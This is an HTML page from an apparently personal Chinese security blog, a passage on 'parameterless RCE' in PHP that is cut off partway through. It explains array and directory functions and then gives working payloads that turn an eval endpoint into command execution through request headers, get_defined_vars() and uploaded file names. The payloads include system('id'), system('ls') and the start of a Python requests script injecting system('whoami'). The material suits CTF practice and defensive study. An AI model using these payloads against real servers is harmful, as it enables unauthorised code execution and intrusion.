<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="en">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>无参数rce - 东隅 Blog</title><meta name="author" content="东隅">
<meta name="author-link" content="">
<meta name="description" content="" /><meta name="keywords" content='OWASP, 命令执行' />
  <meta itemprop="name" content="无参数rce">
  <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
  <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
  <meta itemprop="wordCount" content="251">
  <meta itemprop="keywords" content="OWASP,命令执行"><meta property="og:url" content="https://dongyu29.github.io/posts/owasp/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/110/">
  <meta property="og:site_name" content="东隅 Blog">
  <meta property="og:title" content="无参数rce">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-08-15T09:31:01+08:00">
    <meta property="article:modified_time" content="2024-08-15T09:31:01+08:00">
    <meta property="article:tag" content="OWASP">
    <meta property="article:tag" content="命令执行">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="无参数rce">
<meta name="application-name" content="FixIt">
<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/owasp/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/110/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/48/" /><link rel="next" href="https://dongyu29.github.io/posts/owasp/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/111/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "无参数rce",
    "inLanguage": "en",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https:\/\/dongyu29.github.io\/posts\/owasp\/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C\/110\/"
    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "OWASP, 命令执行","wordcount":  251 ,
    "url": "https:\/\/dongyu29.github.io\/posts\/owasp\/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C\/110\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
      "@type": "Organization",
      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
        "@type": "Person",
        "name": "东隅"
      },"description": ""
  }
  </script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a
                class="menu-link"
                href="/posts/"
                
                
              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/categories/"
                
                
              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/tags/"
                
                
              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/posts/"
                  
                  
                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/categories/"
                  
                  
                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/tags/"
                  
                  
                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">无参数rce</li>
    </ol>
  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>无参数rce</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/owasp/" class="post-category" title="Category - OWASP"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> OWASP</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="251 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 300 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Contents</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#poc1">POC1</a></li>
    <li><a href="#poc2">POC2</a></li>
  </ul>

  <ul>
    <li><a href="#poc1-1">POC1</a></li>
    <li><a href="#poc2-1">POC2</a></li>
    <li><a href="#poc3">poc3</a></li>
  </ul>

  <ul>
    <li><a href="#poc1-2">POC1</a></li>
    <li><a href="#poc2-2">POC2</a></li>
  </ul>

  <ul>
    <li><a href="#查看当前目录文件名">查看当前目录文件名</a>
      <ul>
        <li><a href="#读取当前目录文件">读取当前目录文件</a></li>
        <li><a href="#查看上一级目录文件名">查看上一级目录文件名</a></li>
        <li><a href="#读取上级目录文件">读取上级目录文件</a></li>
        <li><a href="#查看和读取根目录文件">查看和读取根目录文件</a></li>
      </ul>
    </li>
    <li><a href="#解释">解释</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content" data-end-flag="-----（完）-----"><p>主要函数</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">目录操作：</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">getchwd</span>() <span style="color:#58a1dd">：函数返回当前工作目录。</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">scandir</span>() <span style="color:#58a1dd">：函数返回指定目录中的文件和目录的数组。</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">dirname</span>() <span style="color:#58a1dd">：函数返回路径中的目录部分。</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">chdir</span>() <span style="color:#58a1dd">：函数改变当前的目录。</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">数组相关的操作：</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">end</span>() <span style="color:#ff636f">-</span> <span style="color:#58a1dd">将内部指针指向数组中的最后一个元素，并输出。</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">next</span>() <span style="color:#ff636f">-</span> <span style="color:#58a1dd">将内部指针指向数组中的下一个元素，并输出。</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">prev</span>() <span style="color:#ff636f">-</span> <span style="color:#58a1dd">将内部指针指向数组中的上一个元素，并输出。</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">reset</span>() <span style="color:#ff636f">-</span> <span style="color:#58a1dd">将内部指针指向数组中的第一个元素，并输出。</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">each</span>() <span style="color:#ff636f">-</span> <span style="color:#58a1dd">返回当前元素的键名和键值，并将内部指针向前移动。</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">array_shift</span>() <span style="color:#ff636f">-</span> <span style="color:#58a1dd">删除数组中第一个元素，并返回被删除元素的值。</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">current</span>()<span style="color:#ff636f">-</span><span style="color:#58a1dd">返回数组中的当前值</span>    
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">pos</span>()<span style="color:#ff636f">-</span><span style="color:#58a1dd">current</span>() <span style="color:#58a1dd">的别名</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">读文件</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">show_source</span>() <span style="color:#ff636f">-</span> <span style="color:#58a1dd">对文件进行语法高亮显示。</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">readfile</span>() <span style="color:#ff636f">-</span> <span style="color:#58a1dd">输出一个文件。</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">highlight_file</span>() <span style="color:#ff636f">-</span> <span style="color:#58a1dd">对文件进行语法高亮显示。</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">file_get_contents</span>() <span style="color:#ff636f">-</span> <span style="color:#58a1dd">把整个文件读入一个字符串中。</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">readgzfile</span>() <span style="color:#ff636f">-</span> <span style="color:#58a1dd">可用于读取非</span> <span style="color:#58a1dd">gzip</span> <span style="color:#58a1dd">格式的文件</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">getenv</span>() <span style="color:#58a1dd">：获取环境变量的值</span>(<span style="color:#58a1dd">在PHP7</span><span style="color:#ff636f">.</span><span style="color:#a6be9d">1</span><span style="color:#58a1dd">之后可以不给予参数</span>)
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">适用于：php7以上的版本</span></span></span></code></pre></div><p>实例</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$transport</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">array</span>(<span style="color:#a6be9d">&#39;foot&#39;</span>, <span style="color:#a6be9d">&#39;bike&#39;</span>, <span style="color:#a6be9d">&#39;car&#39;</span>, <span style="color:#a6be9d">&#39;plane&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$mode</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">current</span>(<span style="color:#58a1dd">$transport</span>); <span style="color:#828b96;font-style:italic">// $mode = &#39;foot&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$mode</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">next</span>(<span style="color:#58a1dd">$transport</span>);    <span style="color:#828b96;font-style:italic">// $mode = &#39;bike&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$mode</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">current</span>(<span style="color:#58a1dd">$transport</span>); <span style="color:#828b96;font-style:italic">// $mode = &#39;bike&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$mode</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">prev</span>(<span style="color:#58a1dd">$transport</span>);    <span style="color:#828b96;font-style:italic">// $mode = &#39;foot&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$mode</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">end</span>(<span style="color:#58a1dd">$transport</span>);     <span style="color:#828b96;font-style:italic">// $mode = &#39;plane&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$mode</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">current</span>(<span style="color:#58a1dd">$transport</span>); <span style="color:#828b96;font-style:italic">// $mode = &#39;plane&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$arr</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">array</span>();
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">var_dump</span>(<span style="color:#58a1dd">current</span>(<span style="color:#58a1dd">$arr</span>)); <span style="color:#828b96;font-style:italic">// bool(false)
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$arr</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">array</span>(<span style="color:#ff636f">array</span>());
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">var_dump</span>(<span style="color:#58a1dd">current</span>(<span style="color:#58a1dd">$arr</span>)); <span style="color:#828b96;font-style:italic">// array(0) { }
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#828b96;font-style:italic">?&gt;</span>
</span></span></code></pre></div><h1 id="环境变量" class="heading-element"><span>环境变量</span>
  <a href="#%e7%8e%af%e5%a2%83%e5%8f%98%e9%87%8f" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>var_dump(getenv(phpinfo()));</p>
<h1 id="http-请求标头" class="heading-element"><span>HTTP 请求标头</span>
  <a href="#http-%e8%af%b7%e6%b1%82%e6%a0%87%e5%a4%b4" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p><strong>getallheaders()</strong>：获取所有 HTTP 请求标头</p>
<p>apache_request_headers()的别名函数，但是该函数只能在Apache环境下使用
传入?code=print_r(getallheaders());，数组返回 HTTP 请求头</p>
<h2 id="poc1" class="heading-element"><span>POC1</span>
  <a href="#poc1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>使用end指向最后一个请求头，用其值进行rce</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#58a1dd">GET</span> <span style="color:#58a1dd">/1.php?code=eval(end(getallheaders()));</span> <span style="color:#ff636f">HTTP</span><span style="color:#ff636f">/</span><span style="color:#a6be9d">1.1</span>
</span></span><span style="display:flex;"><span>.....
</span></span><span style="display:flex;"><span>flag: system(&#39;id&#39;);</span></span></code></pre></div><h2 id="poc2" class="heading-element"><span>POC2</span>
  <a href="#poc2" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>此payload适用于php7以上版本</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#58a1dd">GET</span> <span style="color:#58a1dd">/1.php?exp=eval(end(apache_request_headers()));</span>  <span style="color:#ff636f">HTTP</span><span style="color:#ff636f">/</span><span style="color:#a6be9d">1.1</span>
</span></span><span style="display:flex;"><span>....
</span></span><span style="display:flex;"><span>flag: system(&#39;id&#39;);</span></span></code></pre></div><h1 id="全局变量" class="heading-element"><span>全局变量</span>
  <a href="#%e5%85%a8%e5%b1%80%e5%8f%98%e9%87%8f" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><h2 id="poc1-1" class="heading-element"><span>POC1</span>
  <a href="#poc1-1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><strong>get_defined_vars()</strong>：返回由所有已定义变量所组成的数组，会返回$_GET,$_POST,$_COOKIE,$_FILES全局变量的值，返回数组顺序为get-&gt;post-&gt;cookie-&gt;files
<strong>current()</strong>：返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回$_GET变量的数组值</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">?</span><span style="color:#58a1dd">code</span><span style="color:#ff636f">=</span><span style="color:#ff636f">eval</span>(<span style="color:#58a1dd">end</span>(<span style="color:#58a1dd">current</span>(<span style="color:#58a1dd">get_defined_vars</span>())));<span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">flag</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">system</span>(<span style="color:#a6be9d">&#39;ls&#39;</span>);</span></span></code></pre></div><h2 id="poc2-1" class="heading-element"><span>POC2</span>
  <a href="#poc2-1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">?</span><span style="color:#58a1dd">flag</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">system</span>(<span style="color:#a6be9d">&#39;id&#39;</span>);<span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">code</span><span style="color:#ff636f">=</span><span style="color:#ff636f">eval</span>(<span style="color:#58a1dd">pos</span>(<span style="color:#58a1dd">pos</span>(<span style="color:#58a1dd">get_defined_vars</span>())));</span></span></code></pre></div><h2 id="poc3" class="heading-element"><span>poc3</span>
  <a href="#poc3" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>而如果网站对$_GET,$_POST,$_COOKIE都做的过滤， 那我们只能从$_FILES入手了，file数组在最后一个，需要end定位，然后pos两次定位获得文件名</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">requests</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">files</span> <span style="color:#ff636f">=</span> {
</span></span><span style="display:flex;"><span>   <span style="color:#a6be9d">&#34;system(&#39;whoami&#39;);&#34;</span>: <span style="color:#a6be9d">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#data = {</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#&#34;code&#34;:&#34;eval(pos(pos(end(get_defined_vars()))));&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#}</span>
